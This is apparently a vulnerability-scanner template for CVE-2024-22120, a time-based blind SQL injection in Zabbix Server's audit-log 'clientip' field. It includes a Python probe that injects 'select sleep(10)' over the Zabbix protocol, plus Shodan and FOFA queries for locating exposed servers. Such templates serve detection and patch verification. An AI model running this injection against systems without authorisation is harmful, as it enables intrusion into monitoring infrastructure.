code:
- engine:
  - py
  - python3
  matchers:
  - type: word
    words:
    - Vulnerable to CVE-2024-22120
  source: "import os, struct, socket\nfrom datetime import datetime\nhostname=os.getenv('HOST')\n\
    port=int(os.getenv('PORT'))\nsid=os.getenv('SID')\nhostid=os.getenv('HOSTID')\n\
    zbx_header = \"ZBXD\\x01\".encode()\nmessage_json = \"{\\\"request\\\": \\\"command\\\
    \", \\\"sid\\\": \\\"\" + sid + \"\\\", \\\"scriptid\\\": \\\"3\\\", \\\"clientip\\\
    \": \\\"' + (select sleep(10)) + '\\\", \\\"hostid\\\": \\\"\" + hostid + \"\\\
    \"}\"\nmessage_length = struct.pack('<q', len(message_json))\nmessage = zbx_header\
    \ + message_length + message_json.encode()\nbefore_query = datetime.now().timestamp()\n\
    s = socket.socket()\ns.connect((hostname,port))\ns.send(message)\nresponse = s.recv(1024)\n\
    s.close()\nafter_query = datetime.now().timestamp()\nresponsetime = after_query\
    \ - before_query\nif responsetime >= 10 and zbx_header in response:\n    print(\"\
    Vulnerable to CVE-2024-22120\")\n"
id: CVE-2024-22120
info:
  author: CodeStuffBreakThings
  classification:
    cve-id: CVE-2024-22120
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.1
    cwe-id: CWE-20
    epss-percentile: 0.09568
    epss-score: 0.00043
  description: 'The Zabbix server can execute commands for configured scripts. After
    executing a command, an audit entry is added to the "Audit Log". Due to the "clientip"
    field not being sanitized, it is possible to inject SQL into "clientip" and exploit
    a time-based blind SQL injection vulnerability.

    '
  metadata:
    fofa-query:
    - icon_hash=892542951
    - "app=\"zabbix-\u76D1\u63A7\u7CFB\u7EDF\" && body=\"saml\""
    - title="zabbix-server"
    google-query: intitle:"zabbix-server"
    max-request: 1
    product: zabbix
    shodan-query:
    - http.title:"zabbix-server"
    - cpe:"cpe:2.3:a:zabbix:zabbix"
    - http.favicon.hash:"892542951"
    vendor: zabbix
  name: Zabbix Server - Time-Based Blind SQL injection
  reference:
  - https://support.zabbix.com/browse/ZBX-24505#/
  - https://github.com/W01fh4cker/CVE-2024-22120-RCE
  - https://nvd.nist.gov/vuln/detail/CVE-2024-22120
  - https://support.zabbix.com/browse/ZBX-24505
  - https://github.com/AboSteam/POPC
  remediation: 'Fixed in versions 6.0.28rc1, 6.4.13rc1, 7.0.0beta2

    '
  severity: critical
  tags: cve,cve2024,authenticated,zabbix,sqli
variables:
  HOST: '{{Host}}'
  HOSTID: '{{HOSTID}}'
  PORT: '{{Port}}'
  SID: '{{SID}}'
